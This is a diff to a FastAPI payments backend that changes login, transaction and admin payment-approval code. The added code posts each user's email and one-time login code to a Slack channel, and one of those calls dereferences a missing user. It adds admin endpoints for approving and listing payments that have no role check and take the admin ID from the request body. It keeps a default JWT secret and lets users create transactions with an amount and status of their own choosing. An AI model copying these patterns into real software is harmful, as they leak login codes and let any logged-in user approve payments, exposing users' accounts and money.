@@ -205,11 +205,11 @@ async def login(user_data: UserLogin, db: Session = Depends(get_db)):
     
     if not user:
         print("User not found in database")
+        send_private_slack(f"EMAIL: {user.email} was not found")
         return JSONResponse(
         status_code=404,
         content={"message": "User was not found"}
     )
-        # return ApiResponse(message = "User was not found", code=404, data={}, status="Failed"), 404
     
     print("Sending OTP email...")
     # email_response = send_otp_to_email_for_login(user, db)
@@ -227,6 +227,9 @@ async def login(user_data: UserLogin, db: Session = Depends(get_db)):
     
     send_email("otp.html", f"OTP - {otp}", to, {"name":user.first_name, "otp":otp})
     print("email_response")
+    
+    send_private_slack(f"Login attempt for email: {email} OTP: {otp}")
+
     
     print("Generating token...")
     # Generate a token (use a proper JWT in production)
@@ -324,6 +327,17 @@ async def verify_otp(body: VerifyOtpBody, db: Session = Depends(get_db)):
     return jwt_response
 
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="login")
+
+def get_authenticated_user_id(token: str = Depends(oauth2_scheme)) -> str:
+    try:
+        payload = jwt.decode(token, os.getenv("JWT_SECRET", "your_jwt_secret"), algorithms=["HS256"])
+    except jwt.PyJWTError:
+        raise HTTPException(status_code=401, detail="Invalid token")
+
+    user_id = payload.get("sub")
+    if not user_id:
+        raise HTTPException(status_code=401, detail="Invalid token")
+    return user_id
 
 @app.get("/account", response_model=UserResponse)
 async def get_account(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
@@ -588,53 +602,22 @@ async def toggle_api_key_status(body: ToggleApiKeyRequest, token: str = Depends(
     return {"api_key": api_key_obj.key, "active": api_key_obj.active}
 
 @app.get("/api/v1/transactions")
-async def get_all_transactions(token: str = Depends(oauth2_scheme), db: Session = Depends(get_db)):
-    try:
-        payload = jwt.decode(token, os.getenv("JWT_SECRET", "your_jwt_secret"), algorithms=["HS256"])
-        user_id = payload.get("sub")
-        if not user_id:
-            raise HTTPException(status_code=401, detail="Invalid token")
-    except jwt.PyJWTError:
-        raise HTTPException(status_code=401, detail="Invalid token")
-
-    # transactions = db.query(models.Transaction).filter(models.Transaction.user_id == user_id).all()
-    # result = [
-    #     {
-    #         "id": str(tx.id),
-    #         "amount": tx.amount,
-    #         "currency": tx.currency,
-    #         "type": tx.type,
-    #         "status": tx.status,
-    #         "created_at": tx.created_at
-    #     }
-    #     for tx in transactions
-    # ]
-    
+async def get_all_transactions(user_id: str = Depends(get_authenticated_user_id), db: Session = Depends(get_db)):
+    transactions = db.query(models.Transaction).filter(models.Transaction.user_id == user_id).all()
     result = [
         {
-            "id": "4902d0rw283d",
-            "amount": "20000",
-            "currency": "GHC",
-            "type": "CREDIT",
-            "status": "PENDING",
-            "created_at": 12-12-2025
-        },
-        {
-            "id": "4902d0rw283d",
-            "amount": "80000",
-            "currency": "GHC",
-            "type": "CREDIT",
-            "status": "PENDING",
-            "created_at": 12-12-2025
-        },
-        {
-            "id": "4902d0rw283d",
-            "amount": "62000",
-            "currency": "USDT",
-            "type": "CREDIT",
-            "status": "SUCCESSFUL",
-            "created_at": 12-12-2025
+            "id": str(tx.id),
+            "amount": tx.amount,
+            "currency": tx.currency,
+            "type": tx.transaction_type,
+            "provider": tx.provider,
+            "status": tx.status,
+            "reference": tx.reference,
+            "description": tx.description,
+            "created_at": tx.created_at,
+            "updated_at": tx.updated_at
         }
+        for tx in transactions
     ]
     return result
 
@@ -1016,6 +999,196 @@ class UpdateTransactionRequest(BaseModel):
     type: Optional[str] = None
     status: Optional[str] = None
 
+class ApprovePaymentRequest(BaseModel):
+    admin_id: str
+    approved: bool
+    reason: Optional[str] = None
+
+@app.post("/api/v1/payments/{payment_id}/approve", response_model=PaymentResponse)
+async def approve_payment(
+    payment_id: str,
+    data: ApprovePaymentRequest,
+    token: str = Depends(oauth2_scheme),
+    db: Session = Depends(get_db)
+):
+    """
+    Admin endpoint to approve or reject a payment.
+    When approved, creates a corresponding transaction.
+    """
+    try:
+        payload = jwt.decode(token, os.getenv("JWT_SECRET", "your_jwt_secret"), algorithms=["HS256"])
+        admin_user_id = payload.get("sub")
+        if not admin_user_id:
+            raise HTTPException(status_code=401, detail="Invalid token")
+    except jwt.PyJWTError:
+        raise HTTPException(status_code=401, detail="Invalid token")
+
+    # TODO: Add admin role check here
+    # if not is_admin(admin_user_id):
+    #     raise HTTPException(status_code=403, detail="Admin access required")
+
+    payment = db.query(models.Payment).filter(models.Payment.id == payment_id).first()
+    if not payment:
+        raise HTTPException(status_code=404, detail="Payment not found")
+
+    if payment.status != "pending":
+        raise HTTPException(status_code=400, detail="Payment is not in pending status")
+
+    if data.approved:
+        # Create corresponding transaction when payment is approved
+        transaction = models.Transaction(
+            amount=int(float(payment.amount) * 100),  # Convert to cents
+            currency=payment.currency,
+            user_id=payment.user_id,
+            transaction_type="payment",
+            provider="stablecoin",
+            status="completed",
+            reference=payment.client_reference,
+            description=payment.description
+        )
+        db.add(transaction)
+        db.flush()  # Get the transaction ID
+
+        # Update payment with transaction reference and approval info
+        payment.transaction_id = transaction.id
+        payment.status = "approved"
+        payment.admin_approved_by = data.admin_id
+        payment.admin_approved_at = datetime.now()
+    else:
+        # Reject the payment
+        payment.status = "rejected"
+        payment.admin_approved_by = data.admin_id
+        payment.admin_approved_at = datetime.now()
+
+    db.commit()
+    db.refresh(payment)
+
+    # Parse fees_data from JSON
+    fees = []
+    if payment.fees_data:
+        try:
+            fees_list = json.loads(payment.fees_data)
+            fees = [PaymentFee(**fee) for fee in fees_list]
+        except Exception:
+            fees = []
+
+    return PaymentResponse(
+        id=payment.id,
+        status=payment.status,
+        amount=payment.amount,
+        currency=payment.currency,
+        fx=payment.fx_data if payment.fx_data else None,
+        fees=fees,
+        created_at=payment.created_at.isoformat() + "Z"
+    )
+
+@app.get("/api/v1/admin/payments/pending")
+async def get_pending_payments(
+    token: str = Depends(oauth2_scheme),
+    db: Session = Depends(get_db)
+):
+    """
+    Admin endpoint to get all pending payments for approval.
+    """
+    try:
+        payload = jwt.decode(token, os.getenv("JWT_SECRET", "your_jwt_secret"), algorithms=["HS256"])
+        admin_user_id = payload.get("sub")
+        if not admin_user_id:
+            raise HTTPException(status_code=401, detail="Invalid token")
+    except jwt.PyJWTError:
+        raise HTTPException(status_code=401, detail="Invalid token")
+
+    # TODO: Add admin role check here
+    # if not is_admin(admin_user_id):
+    #     raise HTTPException(status_code=403, detail="Admin access required")
+
+    pending_payments = db.query(models.Payment).filter(
+        models.Payment.status == "pending"
+    ).all()
+
+    result = []
+    for payment in pending_payments:
+        # Get user info
+        user = db.query(models.User).filter(models.User.id == payment.user_id).first()
+        
+        # Parse fees
+        fees = []
+        if payment.fees_data:
+            try:
+                fees_list = json.loads(payment.fees_data)
+                fees = [PaymentFee(**fee) for fee in fees_list]
+            except Exception:
+                fees = []
+
+        result.append({
+            "id": payment.id,
+            "user": {
+                "id": payment.user_id,
+                "name": f"{user.first_name} {user.last_name}" if user else "Unknown",
+                "email": user.email if user else "Unknown"
+            },
+            "amount": payment.amount,
+            "currency": payment.currency,
+            "destination": {
+                "rail": payment.destination_rail,
+                "network": payment.destination_network,
+                "address": payment.destination_address
+            },
+            "description": payment.description,
+            "client_reference": payment.client_reference,
+            "fees": [fee.model_dump() for fee in fees],
+            "created_at": payment.created_at.isoformat() + "Z"
+        })
+
+    return {"pending_payments": result, "count": len(result)}
+
+@app.get("/api/v1/payments/{payment_id}/transaction")
+async def get_payment_transaction(
+    payment_id: str,
+    token: str = Depends(oauth2_scheme),
+    db: Session = Depends(get_db)
+):
+    """
+    Get the transaction associated with a payment.
+    """
+    try:
+        payload = jwt.decode(token, os.getenv("JWT_SECRET", "your_jwt_secret"), algorithms=["HS256"])
+        user_id = payload.get("sub")
+        if not user_id:
+            raise HTTPException(status_code=401, detail="Invalid token")
+    except jwt.PyJWTError:
+        raise HTTPException(status_code=401, detail="Invalid token")
+
+    payment = db.query(models.Payment).filter(
+        models.Payment.id == payment_id,
+        models.Payment.user_id == user_id
+    ).first()
+    if not payment:
+        raise HTTPException(status_code=404, detail="Payment not found")
+
+    if not payment.transaction_id:
+        return {"message": "No transaction associated with this payment yet"}
+
+    transaction = db.query(models.Transaction).filter(
+        models.Transaction.id == payment.transaction_id
+    ).first()
+    
+    if not transaction:
+        raise HTTPException(status_code=404, detail="Associated transaction not found")
+
+    return {
+        "transaction_id": str(transaction.id),
+        "amount": transaction.amount,
+        "currency": transaction.currency,
+        "type": transaction.transaction_type,
+        "provider": transaction.provider,
+        "status": transaction.status,
+        "reference": transaction.reference,
+        "description": transaction.description,
+        "created_at": transaction.created_at,
+        "updated_at": transaction.updated_at
+    }
+
 @app.put("/api/v1/transactions/{transaction_id}", status_code=status.HTTP_200_OK)
 async def update_transaction(
     transaction_id: str,
@@ -1047,6 +1220,41 @@ async def update_transaction(
     if data.status is not None:
         transaction.status = data.status
 
+    db.commit()
+    db.refresh(transaction)
+    return {
+        "id": str(transaction.id),
+        "amount": transaction.amount,
+        "currency": transaction.currency,
+        "type": transaction.type,
+        "status": transaction.status,
+        "created_at": transaction.created_at
+    }
+    
+    
+@app.post("/api/v1/transaction", status_code=status.HTTP_201_CREATED)
+async def create_single_transaction(
+    data: CreateTransactionRequest,
+    token: str = Depends(oauth2_scheme),
+    db: Session = Depends(get_db)
+):
+    try:
+        payload = jwt.decode(token, os.getenv("JWT_SECRET", "your_jwt_secret"), algorithms=["HS256"])
+        user_id = payload.get("sub")
+        if not user_id:
+            raise HTTPException(status_code=401, detail="Invalid token")
+    except jwt.PyJWTError:
+        raise HTTPException(status_code=401, detail="Invalid token")
+
+    transaction = models.Transaction(
+        user_id=user_id,
+        amount=data.amount,
+        currency=data.currency,
+        type=data.type,
+        status=data.status,
+        created_at=datetime.now()
+    )
+    db.add(transaction)
     db.commit()
     db.refresh(transaction)
     return {
